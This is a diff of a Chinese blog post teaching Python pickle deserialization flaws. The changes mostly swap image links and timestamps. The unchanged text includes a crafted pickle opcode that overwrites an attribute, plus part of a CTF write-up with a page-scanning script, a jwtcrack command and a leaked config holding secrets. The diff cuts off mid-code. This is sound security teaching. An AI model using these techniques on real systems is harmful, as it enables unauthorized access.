@@ -26,30 +26,31 @@
 <meta property="og:site_name" content="Colourful">
 <meta property="og:description" content="面试的时候被问到不太答得上来就想着学一学，正好BUU刷到了题，就学一学这个漏洞，感觉了解过php反序列化的再对python语言有点了解之后会比较好上手，可以类比php反序列化学习 下面是学习的一些网站，大致从5个方面浅析pickle反序列化可以参考原文 例题[CISCN2019 华北赛区 Day1 Web2]ikun 基础原理 漏洞利用和绕过 魔术方法 防护与示例 从零开始和一些绕过  什么是p">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310195239350.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310195652184.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310201734821.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311200442381.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311200652436.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311201147656.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260312002823859.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194632656.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194718502.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194722385.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194728004.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194731116.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194734575.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315184231482.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191348532.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191351269.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191354093.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191358562.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191401261.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191403563.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191415036.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191434394.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191437395.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191440698.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191443585.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191447018.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191451128.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191454166.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194738040.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194740977.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194751162.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194753938.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191458066.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191501210.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191509413.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191512252.png">
 <meta property="article:published_time" content="2026-03-10T11:20:23.000Z">
-<meta property="article:modified_time" content="2026-03-15T11:52:47.275Z">
+<meta property="article:modified_time" content="2026-03-24T11:15:12.437Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="pickle">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310195239350.png">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191348532.png">
 <meta name="twitter:creator" content="@Colorful">
   
   
@@ -438,7 +439,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-03-15T19:52:47+08:00
+                    本文最后更新于 2026-03-24T19:15:12+08:00
                   
                   
 
@@ -515,14 +516,14 @@
 <li><code>&#39;rb&#39;</code> 表示以二进制读模式打开文件。</li>
 <li><code>pickle.load()</code> 从文件中读取字节流并反序列化为 Python 对象</li>
 </ul>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310195239350.png" srcset="/img/loading.gif" lazyload alt="image-20260310195239350"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191348532.png" srcset="/img/loading.gif" lazyload alt="image-20260324191348532"></p>
 <p>可以看到这里与php反序列化不同的是，python序列化后的结果并没有之前我们所规定的属性</p>
 <h2 id="对文件的反序列化"><a href="#对文件的反序列化" class="headerlink" title="对文件的反序列化"></a>对文件的反序列化</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;YoSheep&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;people&quot;</span>&#125; <span class="hljs-comment">#原始字典，键值对</span><br><br><span class="hljs-comment"># 序列化到文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.pkl&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#&quot;wb&quot;模式：w = write（写入）b = binary（二进制）</span><br>    pickle.dump(data, f) <span class="hljs-comment">#将 data 对象序列化并写入文件 data.pkl</span><br><br><span class="hljs-comment"># 从文件反序列化</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.pkl&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#&quot;rb&quot;模式：r=read（读取）b = binary（二进制）</span><br>    obj = pickle.load(f)<span class="hljs-comment">#从文件 f 中读取 pickle 数据并还原为 Python 对象 即obj 的值等于原始 data</span><br><br><span class="hljs-built_in">print</span>(obj)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310195652184.png" srcset="/img/loading.gif" lazyload alt="image-20260310195652184"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191351269.png" srcset="/img/loading.gif" lazyload alt="image-20260324191351269"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, score</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br>        <span class="hljs-variable language_">self</span>.score = score<br><br><span class="hljs-comment"># 自定义打印时的字符串格式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Student(name=<span class="hljs-subst">&#123;self.name&#125;</span>, age=<span class="hljs-subst">&#123;self.age&#125;</span>, score=<span class="hljs-subst">&#123;self.score&#125;</span>)&quot;</span><br><br>stu = student(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-number">90</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;序列化前：&quot;</span>, stu)<br><span class="hljs-comment"># 序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;序列化后：&quot;</span>, pickle.dumps(stu))<br><span class="hljs-comment"># 反序列化</span><br>s = pickle.loads(pickle.dumps(stu))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反序列化后：&quot;</span>, s)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260310201734821.png" srcset="/img/loading.gif" lazyload alt="image-20260310201734821"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191354093.png" srcset="/img/loading.gif" lazyload alt="image-20260324191354093"></p>
 <p>该对象经历了一个：<code>对象 -&gt; 二进制数据 -&gt; 对象</code>的过程</p>
 <h2 id="可序列化的对象类型"><a href="#可序列化的对象类型" class="headerlink" title="可序列化的对象类型"></a>可序列化的对象类型</h2><p>Pickle 可以序列化大多数 Python 对象，包括：</p>
 <ul>
@@ -580,13 +581,13 @@
 <h2 id="序列化对象到文件"><a href="#序列化对象到文件" class="headerlink" title="序列化对象到文件"></a>序列化对象到文件</h2><p>将一个字典对象序列化并保存到文件 <code>data.pkl</code> 中</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>data = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>&#125;<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.pkl&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311200442381.png" srcset="/img/loading.gif" lazyload alt="image-20260311200442381"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191358562.png" srcset="/img/loading.gif" lazyload alt="image-20260324191358562"></p>
 <h2 id="从文件反序列化"><a href="#从文件反序列化" class="headerlink" title="从文件反序列化"></a>从文件反序列化</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>data = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>&#125;<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.pkl&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    loaded_data = pickle.load(f)<br><span class="hljs-built_in">print</span>(loaded_data)  <span class="hljs-comment"># 输出: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 25&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311200652436.png" srcset="/img/loading.gif" lazyload alt="image-20260311200652436"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191401261.png" srcset="/img/loading.gif" lazyload alt="image-20260324191401261"></p>
 <h2 id="序列化为字节串"><a href="#序列化为字节串" class="headerlink" title="序列化为字节串"></a>序列化为字节串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>data = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>&#125;<br>bytes_data = pickle.dumps([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], protocol=<span class="hljs-number">4</span>)<br>restored_list = pickle.loads(bytes_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原始数据:&quot;</span>, data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;序列化后的字节串:&quot;</span>, bytes_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反序列化后的数据:&quot;</span>, restored_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;是否相等:&quot;</span>, data == restored_list)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260311201147656.png" srcset="/img/loading.gif" lazyload alt="image-20260311201147656"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191403563.png" srcset="/img/loading.gif" lazyload alt="image-20260324191403563"></p>
 <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="反序列化即执行指令"><a href="#反序列化即执行指令" class="headerlink" title="反序列化即执行指令"></a>反序列化即执行指令</h2><p>pickle反序列化遵循“指令驱动”逻辑，字节流中包含的不是原始数据而是“如何构造对象的步骤”</p>
 <p>关键危险点在于：</p>
 <ul>
@@ -854,7 +855,7 @@
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>若存在类<code>Secret</code>,类有一个<code>name</code>属性,那我们可以通过pickle反序列化修改这个属性的值</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Secret</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name <span class="hljs-comment"># 输出: 修改前 s.name = S1nKk</span><br><br><span class="hljs-comment"># 创建实例</span><br>s=Secret(<span class="hljs-string">&quot;S1nKk&quot;</span>)<br><span class="hljs-comment"># 恶意 pickle 字节码</span><br>opcode=<span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">s</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;Hello_Pick1e&#x27;</span><br><span class="hljs-string">db.&quot;&quot;&quot;</span><br><span class="hljs-comment"># 执行恶意反序列化</span><br>pickle.loads(opcode)<br><span class="hljs-comment"># 查看修改后的结果</span><br><span class="hljs-built_in">print</span>(s.name)<br><span class="hljs-comment"># pickletools.dis(opcode)</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260312002823859.png" srcset="/img/loading.gif" lazyload alt="image-20260312002823859"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191415036.png" srcset="/img/loading.gif" lazyload alt="image-20260324191415036"></p>
 <p>成功输出Hello_Pick1e，表示成功篡改属性</p>
 <p><strong>opcode(恶意字节码分析)</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">s</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;Hello_Pick1e&#x27;</span><br><span class="hljs-string">db.&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>
@@ -1049,31 +1050,31 @@
 <h1 id="例题-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#例题-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="例题[CISCN2019 华北赛区 Day1 Web2]ikun"></a>例题[CISCN2019 华北赛区 Day1 Web2]ikun</h1><blockquote>
 <p>考点：pickle反序列化，jwt认证，rce，源码泄露</p>
 </blockquote>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194632656.png" srcset="/img/loading.gif" lazyload alt="image-20260315194632656"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191434394.png" srcset="/img/loading.gif" lazyload alt="image-20260324191434394"></p>
 <p>利用脚本找到lv6在第几页</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://7cac9626-c9d0-4f94-8e4f-3de3cf329045.node5.buuoj.cn:81/shop?page=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2000</span>):<br>    urls = url + <span class="hljs-built_in">str</span>(i)<br>    rs = requests.get(urls)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;已检测到&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;页&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> rs.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nlv6在第&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;页&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194718502.png" srcset="/img/loading.gif" lazyload alt="image-20260315194718502"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191437395.png" srcset="/img/loading.gif" lazyload alt="image-20260324191437395"></p>
 <p>这里爆出在181页</p>
 <p>在这里抓包</p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194722385.png" srcset="/img/loading.gif" lazyload alt="image-20260315194722385"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191440698.png" srcset="/img/loading.gif" lazyload alt="image-20260324191440698"></p>
 <p>修改折扣就能购买成功</p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194728004.png" srcset="/img/loading.gif" lazyload alt="image-20260315194728004"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191443585.png" srcset="/img/loading.gif" lazyload alt="image-20260324191443585"></p>
 <p>重定向到&#x2F;b1g_m4mber地址但没有访问权限，但是在Cookie中注意到JWT认证</p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194731116.png" srcset="/img/loading.gif" lazyload alt="image-20260315194731116"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191447018.png" srcset="/img/loading.gif" lazyload alt="image-20260324191447018"></p>
 <p>利用jwt工具爆出key</p>
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.</span>/jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjExIn0.ORv9tRUgM6xBAo30A2dkuDq74gr4thv3FgNAaY6hYy8<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194734575.png" srcset="/img/loading.gif" lazyload alt="image-20260315194734575"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191451128.png" srcset="/img/loading.gif" lazyload alt="image-20260324191451128"></p>
 <p>利用在线网站伪造身份，然后就可以正常访问了</p>
 <p>在源码里看到了<a target="_blank" rel="noopener" href="http://www.zip应该是源码泄露/">www.zip应该是源码泄露</a></p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315184231482.png" srcset="/img/loading.gif" lazyload alt="image-20260315184231482"></p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194738040.png" srcset="/img/loading.gif" lazyload alt="image-20260315194738040"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191454166.png" srcset="/img/loading.gif" lazyload alt="image-20260324191454166"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194738040.png" srcset="/img/loading.gif" lazyload alt="image-20260315194738040"><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191458066.png" srcset="/img/loading.gif" lazyload alt="image-20260324191458066"></p>
 <p>settings.py代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>limit = <span class="hljs-number">9</span><br>US = <span class="hljs-string">&#x27;admin&#x27;</span><br>MI=<span class="hljs-string">&#x27;hint: \u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc&#x27;</span><br>PW = <span class="hljs-string">&#x27;SJ%H0c7_3&#x27;</span><br>debug = <span class="hljs-literal">False</span><br><br>connect_str = <span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % os.path.join(os.getcwd(), <span class="hljs-string">&#x27;sshop.db3&#x27;</span>)<br>cookie_secret = <span class="hljs-string">&#x27;JDIOtOQQjLXklJT/N4aJE.tmYZ.IoK9M0_IHZW448b6exe7p1pysO&#x27;</span><br>jwt_secret = <span class="hljs-string">&#x27;1Kun&#x27;</span><br>Discount = <span class="hljs-number">0.8</span><br>Discount_money=<span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>
 
 <p>解码hint</p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194740977.png" srcset="/img/loading.gif" lazyload alt="image-20260315194740977"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191501210.png" srcset="/img/loading.gif" lazyload alt="image-20260324191501210"></p>
 <p>Admin.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span 